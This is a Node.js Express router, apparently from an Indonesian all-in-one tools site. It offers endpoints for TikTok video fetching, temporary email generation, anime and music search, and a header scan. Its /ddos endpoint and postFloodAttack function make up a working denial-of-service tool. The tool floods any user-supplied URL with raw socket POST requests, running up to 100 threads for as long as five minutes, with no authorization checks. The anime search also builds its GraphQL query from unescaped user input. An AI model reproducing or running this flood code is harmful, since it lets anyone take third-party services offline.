const express = require('express');
const router = express.Router();
const axios = require('axios');
const net = require('net');
const tls = require('tls');
const { URL } = require('url');

let ddosState = { running: false, target: null, requests: 0, success: 0, failed: 0, startedAt: 0, activeSockets: new Set() };

router.post('/video', async (req, res) => {
  try {
    const { url } = req.body;
    if (!url) return res.status(400).json({ ok: false, msg: 'Missing url' });
    if (url.includes('tiktok.com')) {
      const r = await axios.post('https://www.tikwm.com/api/', { url, hd: 1 }, {
        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Accept': 'application/json' }
      });
      if (r.data && r.data.code === 0 && r.data.data) {
        let videoUrl = r.data.data.play || r.data.data.wmplay;
        if (videoUrl && videoUrl.startsWith('http://')) videoUrl = videoUrl.replace('http://', 'https://');
        if (videoUrl && videoUrl.startsWith('/')) videoUrl = 'https://www.tikwm.com' + videoUrl;
        return res.json({ ok: true, result: { title: r.data.data.title || 'Video', video: videoUrl } });
      }
      return res.status(400).json({ ok: false, msg: 'Gagal mengambil video TikTok.' });
    }
    res.json({ ok: true, url, msg: 'Link resolver siap.' });
  } catch (e) { res.status(500).json({ ok: false, msg: 'Server TikTok menolak permintaan.' }); }
});

router.get('/gmail', (req, res) => {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let u = '';
  for (let i = 0; i < 10; i++) u += chars[Math.floor(Math.random() * chars.length)];
  res.json({ ok: true, email: `${u}@mail.tm`, password: u + '!A1' });
});

router.get('/anime', async (req, res) => {
  try {
    const q = req.query.q || 'naruto';
    const gql = `query { Page(perPage: 10) { media(search: "${q}", type: ANIME) { id title { romaji english } coverImage { large } } } }`;
    const r = await axios.post('https://graphql.anilist.co', { query: gql });
    res.json({ ok: true, data: r.data.data.Page.media });
  } catch (e) { res.status(500).json({ ok: false, msg: e.message }); }
});

router.get('/music', async (req, res) => {
  try {
    const q = req.query.q || 'lofi';
    const r = await axios.get('https://itunes.apple.com/search', { params: { term: q, media: 'music', limit: 10 } });
    res.json({ ok: true, data: r.data.results });
  } catch (e) { res.status(500).json({ ok: false, msg: e.message }); }
});

router.post('/scan', async (req, res) => {
  try {
    let { url } = req.body;
    if (!url) return res.status(400).json({ ok: false, msg: 'Missing url' });
    if (!url.startsWith('http')) url = 'https://' + url;

    const r = await axios.get(url, { 
      timeout: 8000, 
      validateStatus: () => true,
      headers: { 'User-Agent': 'Mozilla/5.0' }
    }).catch(err => {
      return { status: 408, headers: {}, data: 'Timeout' };
    });

    const findings = [];
    const headers = r.headers || {};
    if (!headers['content-security-policy']) findings.push('Missing CSP header');
    if (!headers['x-frame-options']) findings.push('Missing X-Frame-Options');
    if (!headers['strict-transport-security']) findings.push('Missing HSTS');
    
    res.json({ ok: true, url, status: r.status, findings, server: headers['server'] || 'Unknown' });
  } catch (e) { 
    res.status(500).json({ ok: false, msg: 'Gagal scan: Server tidak merespon.' }); 
  }
});

function postFloodAttack(targetUrl, stats, io) {
  try {
    const parsed = new URL(targetUrl);
    const isHttps = parsed.protocol === 'https:';
    const port = parsed.port || (isHttps ? 443 : 80);
    const host = parsed.hostname;
    const randomPayload = 'a=' + 'x'.repeat(500);
    const socket = isHttps ? tls.connect({ host, port, rejectUnauthorized: false }) : net.connect({ host, port });
    stats.activeSockets.add(socket);
    socket.on('connect', () => {
      stats.requests++; stats.success++;
      io.emit('ddos:stats', { ...stats, activeSockets: stats.activeSockets.size });
      socket.write(`POST ${parsed.pathname} HTTP/1.1\r\nHost: ${host}\r\nContent-Length: ${randomPayload.length}\r\n\r\n${randomPayload}`);
    });
    socket.on('error', () => { stats.failed++; stats.activeSockets.delete(socket); });
    socket.on('close', () => stats.activeSockets.delete(socket));
  } catch (e) { stats.failed++; }
}

router.post('/ddos', async (req, res) => {
  try {
    const { target, duration, threads } = req.body;
    if (!target || !target.startsWith('http')) return res.status(400).json({ ok: false, msg: 'Target http/https' });
    if (ddosState.running) return res.status(400).json({ ok: false, msg: 'DDoS berjalan' });
    const dur = Math.min(Number(duration) || 10, 300);
    const th = Math.min(Number(threads) || 10, 100);
    ddosState = { running: true, target, requests: 0, success: 0, failed: 0, startedAt: Date.now(), activeSockets: new Set() };
    const io = req.app.get('io');
    res.json({ ok: true, msg: 'Started', state: ddosState });
    (async () => {
      const end = Date.now() + dur * 1000;
      while (ddosState.running && Date.now() < end) {
        for (let i = 0; i < th; i++) postFloodAttack(target, ddosState, io);
        await new Promise(r => setTimeout(r, 100));
      }
      ddosState.running = false;
      io.emit('ddos:done', ddosState);
    })();
  } catch (e) { res.status(500).json({ ok: false, msg: e.message }); }
});

router.post('/ddos/stop', (req, res) => {
  if (!ddosState.running) return res.status(400).json({ ok: false, msg: 'Tidak berjalan' });
  ddosState.running = false;
  ddosState.activeSockets.forEach(sock => { try { sock.destroy(); } catch(e){} });
  ddosState.activeSockets.clear();
  res.json({ ok: true, msg: 'Dihentikan.' });
});

module.exports = router;
